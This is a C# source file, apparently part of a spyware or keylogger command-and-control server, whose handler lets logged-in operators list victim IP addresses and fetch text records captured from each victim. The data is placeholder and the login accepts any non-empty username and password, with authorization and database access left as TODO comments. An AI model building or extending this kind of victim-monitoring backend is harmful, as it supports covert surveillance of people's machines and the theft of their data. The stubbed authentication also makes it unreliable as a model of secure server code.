
using SpyCommunicationLib;
using SpyCommunicationLib.Directors;
using SpyCommunicationLib.Entities;
using System.Net;


namespace Server.Handlers
{
    class UserHandler : IHandler
    {
        private static ServerResponseDirector _director = new ServerResponseDirector();


        public bool CheckConditions(SpyMessage? message)
        {
            if (message == null)
                return false;
            return message._sender == Sender.User;
        }

        private async Task<string> GetVictimIpList(ClientInfo clientInfo)
        {

            if (!clientInfo.IsAuthorized)
                return _director.GetUnauthorizedResponse().ToString();

            // Add connection to DB for get data
            List<string> ip_list = new List<string>()
            {
                "127.0.0.1", "123.2.1.0"
            };
            return _director.GetVictimsIpListResponse(ip_list).ToString();
        }

        private async Task<string> GetVictimRecords(string victimIp, ClientInfo clientInfo)
        {
            if (!clientInfo.IsAuthorized)
                return _director.GetUnauthorizedResponse().ToString();

            // Add connection to DB for get data
            List<VictimRecord> records = new List<VictimRecord>() { 
                new VictimRecord{
                    Id = 1,
                    Date = new DateTime(2020, 10, 31),
                    VictimIp = victimIp,
                    Text = "1111111111111"
                }
            };

            return _director.GetVictimRecordsResponse(records).ToString();
        }

        private async Task<string> LoginUser(string username, string password, ClientInfo clientInfo)
        {
            if (username == String.Empty || password == String.Empty)
                return _director.GetUnauthorizedResponse().ToString();

            // Add check on autorisation

            clientInfo.SetAuthorization(username);
            return _director.GetSuccessResponse().ToString();
        }


        public async Task<string> HandleAsync(SpyMessage? message, ClientInfo clientInfo)
        {
            if (message == null)
                return _director.GetBadRequestResponse().ToString();

            string response;

            switch (message.Action)
            {
                case MessageAction.GetVictimsIpList:
                    response = await GetVictimIpList(clientInfo);
                    break;
                case MessageAction.GetVictimRecords:
                    string victimIp = message.GetOption("victim_ip");
                    response = await GetVictimRecords(victimIp, clientInfo);
                    break;
                case MessageAction.Login:
                    string username = message.GetOption("username");
                    string password = message.GetOption("password");
                    response = await LoginUser(username, password, clientInfo);
                    break;
                default:
                    response = _director.GetNotFoundRequestResponse().ToString(); 
                    break;
            }

            return response;
        }
    }
}
